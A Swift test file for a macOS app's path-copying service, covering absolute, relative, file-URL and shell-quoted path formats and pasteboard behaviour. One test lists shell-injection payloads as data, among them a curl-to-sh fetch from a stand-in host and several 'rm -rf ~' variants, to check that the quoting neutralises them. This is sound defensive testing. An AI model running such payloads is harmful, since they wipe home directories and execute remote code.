import AppKit
import Foundation
@testable import Wiles

@MainActor
public struct CopyPathTests {
    public static func run() {
        let baseDir = URL(fileURLWithPath: "/Users/test/Documents")
        let targetFile = URL(fileURLWithPath: "/Users/test/Documents/My Folder/file (1).txt")

        testFormattingVariants(baseDir: baseDir, targetFile: targetFile)
        testRelativePath(baseDir: baseDir, targetFile: targetFile)
        testCopy(targetFile: targetFile)
        testShellInjectionPayloadsNeutralized()
        testPosixSingleQuotedCdCommand()
    }

    /// H5 regression: `IntegratedTerminalView` now emits `cd \(posixSingleQuoted(path))`, not
    /// `cd "\(escapeForTerminal(path))"`. The old form double-handled a path with a space
    /// (`cd "/a/my\ dir"` → zsh tries to enter `my\ dir` with a literal backslash and fails).
    /// `posixSingleQuoted` must round-trip any path — spaces, metacharacters, embedded apostrophes —
    /// to exactly itself under single-quote parsing, with no stray backslash escaping.
    private static func testPosixSingleQuotedCdCommand() {
        let cases = [
            "/Users/test/Application Support/My Project",
            "/Users/test/O'Brien's Files",
            "/tmp/a&b;c|d$e `x` <y>",
            "/plain/path"
        ]
        for path in cases {
            let command = "cd \(CopyPathService.posixSingleQuoted(path))"
            let recovered = unwrapSingleQuoted(String(command.dropFirst("cd ".count)))
            TestReporter.report(
                "CopyPath",
                "POS: posixSingleQuoted round-trips \(path) through `cd '...'` unchanged",
                result: recovered == path)
        }

        // The space must NOT also be backslash-escaped inside the quotes (that was the H5 bug).
        let spaced = CopyPathService.posixSingleQuoted("/a/my dir")
        TestReporter.report(
            "CopyPath",
            "NEG: posixSingleQuoted does not backslash-escape a space",
            result: spaced == "'/a/my dir'")
    }

    /// Minimal POSIX single-quote parser: strips the outer `'...'` and turns each `'\''` sequence
    /// back into a literal `'`, exactly as a shell would.
    private static func unwrapSingleQuoted(_ token: String) -> String {
        guard token.hasPrefix("'"), token.hasSuffix("'"), token.count >= 2 else { return token }
        let inner = String(token.dropFirst().dropLast())
        return inner.replacingOccurrences(of: "'\\''", with: "'")
    }

    /// Regression coverage for the `.terminalEscaped` copy variant: the copied string is a single
    /// POSIX-quoted token, so every shell metacharacter, `~`, and embedded newline is inert and the
    /// path round-trips exactly when the shell unquotes it.
    private static func testShellInjectionPayloadsNeutralized() {
        let payloads = [
            "/tmp/$(curl evil.sh|sh)",
            "/tmp/`rm -rf ~`",
            "/tmp/\"; rm -rf ~; echo \"",
            "/tmp/; touch /tmp/pwned ;",
            "/tmp/~root/secret",
            "/tmp/line one\nrm -rf ~"
        ]
        for payload in payloads {
            let url = URL(fileURLWithPath: payload)
            let expectedPath = url.standardizedFileURL.path
            let quoted = CopyPathService.format(url: url, variant: .terminalEscaped)
            let recovered = unwrapSingleQuoted(quoted)
            TestReporter.report(
                "CopyPath",
                "NEG: terminalEscaped single-quotes an injection/~/newline payload so it stays a literal path (\(payload.replacingOccurrences(of: "\n", with: "\\n")))",
                result: quoted.hasPrefix("'") && quoted.hasSuffix("'") && recovered == expectedPath)
        }
    }

    private static func testFormattingVariants(baseDir: URL, targetFile: URL) {
        // POS: Absolute Path Format
        let absolute = CopyPathService.format(url: targetFile, variant: .absolute, relativeTo: baseDir)
        TestReporter.report("CopyPath", "POS: Absolute path formatting", result: absolute == "/Users/test/Documents/My Folder/file (1).txt")

        // POS: Relative Path Format
        let relative = CopyPathService.format(url: targetFile, variant: .relative, relativeTo: baseDir)
        TestReporter.report("CopyPath", "POS: Relative path formatting", result: relative == "My Folder/file (1).txt")

        // POS: File URL Format
        let fileURL = CopyPathService.format(url: targetFile, variant: .fileURL, relativeTo: baseDir)
        TestReporter.report(
            "CopyPath",
            "POS: File URL formatting",
            result: fileURL == "file:///Users/test/Documents/My%20Folder/file%20(1).txt" || fileURL.contains("file:///"))

        // POS: Terminal Escaped Path Format — a single POSIX-quoted token
        let escaped = CopyPathService.format(url: targetFile, variant: .terminalEscaped, relativeTo: baseDir)
        TestReporter.report(
            "CopyPath",
            "POS: Terminal escaped formatting wraps the path in single quotes",
            result: escaped == "'/Users/test/Documents/My Folder/file (1).txt'")

        // POS: fileURL formatting percent-encodes spaces and parentheses
        let fileURLEncoded = CopyPathService.format(url: targetFile, variant: .fileURL, relativeTo: baseDir)
        TestReporter.report(
            "CopyPath",
            "POS: fileURL formatting percent-encodes spaces and parentheses",
            result: fileURLEncoded == "file:///Users/test/Documents/My%20Folder/file%20(1).txt")

        // POS: terminalEscaped keeps an embedded apostrophe literal via the '\'' sequence
        let apostrophe = URL(fileURLWithPath: "/tmp/O'Brien.txt")
        let apostropheEscaped = CopyPathService.format(url: apostrophe, variant: .terminalEscaped)
        TestReporter.report(
            "CopyPath",
            "POS: terminalEscaped encodes an embedded apostrophe as '\\''",
            result: apostropheEscaped == "'/tmp/O'\\''Brien.txt'")
    }

    private static func testRelativePath(baseDir: URL, targetFile: URL) {
        // POS: relativePath with a nil base falls back to the absolute path
        let noBase = CopyPathService.relativePath(of: targetFile, relativeTo: nil)
        TestReporter.report("CopyPath", "POS: relativePath(relativeTo: nil) returns the absolute path", result: noBase == targetFile.standardizedFileURL.path)

        // POS: relativePath when target equals base returns "."
        let sameAsBase = CopyPathService.relativePath(of: baseDir, relativeTo: baseDir)
        TestReporter.report("CopyPath", "POS: relativePath(target == base) returns \".\"", result: sameAsBase == ".")

        // NEG: relativePath when target is not under base returns the full path unchanged
        let unrelated = URL(fileURLWithPath: "/Volumes/External/other.txt")
        let notUnderBase = CopyPathService.relativePath(of: unrelated, relativeTo: baseDir)
        TestReporter.report(
            "CopyPath",
            "NEG: relativePath falls back to the full path when target is outside base",
            result: notUnderBase == unrelated.standardizedFileURL.path)

        // POS: relativePath does not false-positive match on a base that is a string-prefix but not a path-prefix
        let similarBase = URL(fileURLWithPath: "/Users/test/Doc")
        let similarTarget = URL(fileURLWithPath: "/Users/test/Documents/file.txt")
        let similarResult = CopyPathService.relativePath(of: similarTarget, relativeTo: similarBase)
        TestReporter.report(
            "CopyPath",
            "NEG: relativePath does not match a base that is only a string-prefix",
            result: similarResult == similarTarget.standardizedFileURL.path)

        // POS: relativePath handles a base URL with a trailing slash the same as without
        let baseWithSlash = URL(fileURLWithPath: "/Users/test/Documents/")
        let relativeWithSlashBase = CopyPathService.relativePath(of: targetFile, relativeTo: baseWithSlash)
        TestReporter.report("CopyPath", "POS: relativePath handles a trailing-slash base directory", result: relativeWithSlashBase == "My Folder/file (1).txt")
    }

    private static func testCopy(targetFile: URL) {
        // NEG: copy() with an empty URL array does not touch the pasteboard
        let pasteboard = NSPasteboard.general
        pasteboard.clearContents()
        pasteboard.setString("sentinel", forType: .string)
        CopyPathService.copy(urls: [], variant: .absolute)
        TestReporter.report(
            "CopyPath",
            "NEG: copy() with an empty selection leaves the pasteboard untouched",
            result: pasteboard.string(forType: .string) == "sentinel")

        // POS: copy() with real URLs writes the formatted path(s) to the pasteboard
        CopyPathService.copy(urls: [targetFile], variant: .absolute)
        TestReporter.report(
            "CopyPath",
            "POS: copy() writes the formatted path to the system pasteboard",
            result: pasteboard.string(forType: .string) == targetFile.standardizedFileURL.path)

        // POS: copy() with multiple URLs joins the formatted paths with newlines
        let tempDir = URL(fileURLWithPath: testTemporaryDirectory()).appendingPathComponent(UUID().uuidString)
        let secondFile = tempDir.appendingPathComponent("second file.txt")
        CopyPathService.copy(urls: [targetFile, secondFile], variant: .absolute)
        let expectedMulti = [targetFile.standardizedFileURL.path, secondFile.standardizedFileURL.path].joined(separator: "\n")
        TestReporter.report(
            "CopyPath",
            "POS: copy() with multiple URLs joins paths with newlines",
            result: pasteboard.string(forType: .string) == expectedMulti)
    }
}
